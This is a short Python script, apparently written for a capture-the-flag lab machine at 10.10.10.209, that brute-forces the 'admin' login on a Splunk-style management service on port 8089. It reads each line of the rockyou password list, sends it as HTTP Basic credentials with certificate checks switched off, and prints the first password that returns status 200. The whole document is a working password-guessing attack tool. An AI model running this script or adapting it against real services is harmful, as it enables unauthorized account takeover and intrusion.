import requests
from urllib3.exceptions import InsecureRequestWarning

headers = {
'Host': '10.10.10.209:8089',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'close',
'Referer': 'https://10.10.10.209:8089/',
'Upgrade-Insecure-Requests': '1',
'DNT': '1',
'Sec-GPC': '1'
}

auth = "Authorization: Basic admin:changeme"

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

print("Starting password brute force...\n")

with open("/home/zweilos/rockyou_utf8.txt", "r") as rockyou:
    for password in rockyou:
            r = requests.get('https://10.10.10.209:8089/services', auth=('admin', password), headers = headers, verify = False)
            if r.status_code == 200:
                print(f"The password is: {password}\n")
                break
            else:
                continue

print("Thank you for using this service!\n")
